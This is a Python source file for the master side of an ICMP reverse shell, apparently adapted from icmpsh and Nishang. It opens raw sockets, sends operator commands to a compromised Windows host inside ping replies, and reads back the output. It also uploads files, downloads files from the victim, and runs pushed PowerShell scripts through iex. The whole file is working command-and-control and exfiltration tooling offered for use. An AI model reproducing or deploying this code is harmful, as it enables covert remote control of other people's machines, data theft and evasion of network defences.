#!/usr/bin/env python
import os
import os.path
import select
import socket
import subprocess
import sys
import base64

# sysctl -w net.ipv4.icmp_echo_ignore_all=1
# python icmpsh_m.py 192.168.254.226 192.168.254.1
# https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellIcmp.ps1
# borrowed from: https://github.com/inquisb/icmpsh


def invoke_file(src_file):
    payload = []
    n = 100
    try:
        if not os.path.isfile(src_file):
            sys.stdout.write("file doesn't exist %s\n" % src_file)
            return payload
        data = base64.b64encode(open(src_file.strip(), 'rb').read())
        chunks = [data[i:i + n] for i in range(0, len(data), n)]
        for chunk in chunks:
            if chunk != '':
                payload.append('$d+="%s";echo "upload_success";' % chunk)
        chunk = 'try {iex($d);echo "upload_success";$d="";} ' \
                'catch {echo "upload_fail";$d="";}'        
        payload.append(chunk)
        sys.stdout.write('invoking file %s \n' % src_file)
    except Exception as err:
        sys.stderr.write('error invoke_file %s\n' % str(err))
    return payload


def put_file(src_file, dst_file):
    payload = []
    n = 100
    try:
        if not os.path.isfile(src_file):
            sys.stdout.write("file doesn't exist %s\n" % src_file)
            return payload
        data = base64.b64encode(open(src_file.strip(), 'rb').read())
        chunks = [data[i:i + n] for i in range(0, len(data), n)]
        for chunk in chunks:
            if chunk != '':
                payload.append('$d+="%s";echo "upload_success";' % chunk)
        chunk = 'try {[io.file]::writeallbytes("%s", [convert]::frombase64string($d));echo "upload_success";$d="";} ' \
                'catch {echo "upload_fail";$d="";}'
        chunk = chunk % dst_file.strip().replace('/', '\\')
        payload.append(chunk)
        sys.stdout.write('uploading file %s to %s\n' % (src_file, dst_file))
    except Exception as err:
        sys.stderr.write('error put_file %s\n' % str(err))
    return payload


def get_file(src_file, dst_file):
    payload = ''
    try:
        payload = 'try {$d=[convert]::tobase64string([io.file]::readallbytes("%s"));echo "start_get_file|%s|$($d)|' \
                  'end_get_file";} catch {echo "start_get_file|fail|fail|end_get_file";}'
        payload = payload % (src_file.replace('/', '\\'), dst_file)
        sys.stdout.write('downloading file %s to %s\n' % (src_file, dst_file))
    except Exception as err:
        sys.stderr.write('error get_file file %s\n' % str(err))
    return payload


def write_get_file(enc_data):
    result = 'download_fail'
    try:
        idx = enc_data.split('get_file')[1]
        dst_data = idx.split('|')
        src_file, file_data = dst_data[1], dst_data[2]
        if src_file != 'fail':
            open(src_file, 'wb').write(base64.b64decode(file_data))
            result = 'download_success'
    except Exception as err:
        sys.stderr.write('error write_get_file %s\n' % str(err))
    return result


def set_blocking(fd):
    import fcntl
    flags = fcntl.fcntl(fd, fcntl.F_GETFL)
    flags = flags | os.O_NONBLOCK
    fcntl.fcntl(fd, fcntl.F_SETFL, flags)


def main(src, dst):
    buffer = ''
    buffer_out = []
    next_out = ''

    if subprocess.mswindows:
        sys.stderr.write('icmpsh master can only run on Posix systems\n')
        sys.exit(255)

    try:
        from impacket import ImpactDecoder
        from impacket import ImpactPacket
    except ImportError:
        sys.stderr.write('You need to install Python Impacket library first\n')
        sys.exit(255)

    stdin_fd = sys.stdin.fileno()
    set_blocking(stdin_fd)

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    except Exception:
        sys.stderr.write('You need to run icmpsh master with administrator privileges\n')
        sys.exit(1)

    sock.setblocking(0)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

    ip = ImpactPacket.IP()
    ip.set_ip_src(src)
    ip.set_ip_dst(dst)
    icmp = ImpactPacket.ICMP()
    icmp.set_icmp_type(icmp.ICMP_ECHOREPLY)
    decoder = ImpactDecoder.IPDecoder()

    while 1:
        cmd = ''
        if sock in select.select([sock], [], [])[0]:
            buff = sock.recv(4096)

            if 0 == len(buff):
                sock.close()
                sys.exit(0)

            ippacket = decoder.decode(buff)
            icmppacket = ippacket.child()
            if ippacket.get_ip_dst() == src and ippacket.get_ip_src() == dst and 8 == icmppacket.get_icmp_type():
                ident = icmppacket.get_icmp_id()
                seq_id = icmppacket.get_icmp_seq()
                data = icmppacket.get_data_as_string()

                if len(data) > 0:
                    if 'start_get_file' in data and 'end_get_file' in data:
                        result = write_get_file(data)
                        data = result
                        buffer = ''
                    elif 'start_get_file' in data and 'end_get_file' not in data:
                        buffer += data
                    elif 'start_get_file' in buffer and 'end_get_file' in buffer:
                        result = write_get_file(buffer)
                        data = result
                        buffer = ''
                    elif 'start_get_file' not in data and 'end_get_file' not in data and buffer != '':
                        buffer += data
                    elif 'start_get_file' not in data and 'end_get_file' in data:
                        buffer += data
                        result = write_get_file(buffer)
                        buffer = ''
                        data = result
                    elif 'upload_success' in data:
                        next_out = ''
                        if len(buffer_out) > 0:
                            next_out = buffer_out.pop(0)

                    if buffer == '' and len(buffer_out) <= 0 and next_out == '':
                        sys.stdout.write(data)

                try:
                    if next_out != '':
                        cmd = next_out
                    else:
                        cmd = sys.stdin.readline()
                except:
                    pass

                if cmd == 'exit\n':
                    return
                if 'get_file' in cmd:
                    cmd_args = cmd.strip().split(' ')
                    cmd = get_file(cmd_args[1], cmd_args[2])
                elif ('put_file' in cmd or 'invoke_file' in cmd) and len(buffer_out) <= 0:
                    cmd_args = cmd.strip().split(' ')
                    if cmd_args[0] == 'put_file':
                        buffer_out = put_file(cmd_args[1], cmd_args[2])
                    else:
                        buffer_out = invoke_file(cmd_args[1])
                    cmd = ''
                    if len(buffer_out) > 0:
                        cmd = buffer_out.pop(0)

                # if cmd != '':
                #     print(cmd)
                icmp.set_icmp_id(ident)
                icmp.set_icmp_seq(seq_id)
                icmp.contains(ImpactPacket.Data(cmd))
                icmp.set_icmp_cksum(0)
                icmp.auto_checksum = 1
                ip.contains(icmp)
                sock.sendto(ip.get_packet(), (dst, 0))


if __name__ == '__main__':
    if len(sys.argv) < 3:
        msg = 'missing mandatory options. Execute as root:\n'
        msg += './icmpsh-m.py <source IP address> <destination IP address>\n'
        msg += 'upload options: put_file /folder/file c:/folder/file\n'
        msg += 'invoke options: invoke_file /folder/file\n'
        msg += 'download options: get_file c:/folder/file /folder/file\n'
        sys.stderr.write(msg)
        sys.exit(1)
    main(sys.argv[1], sys.argv[2])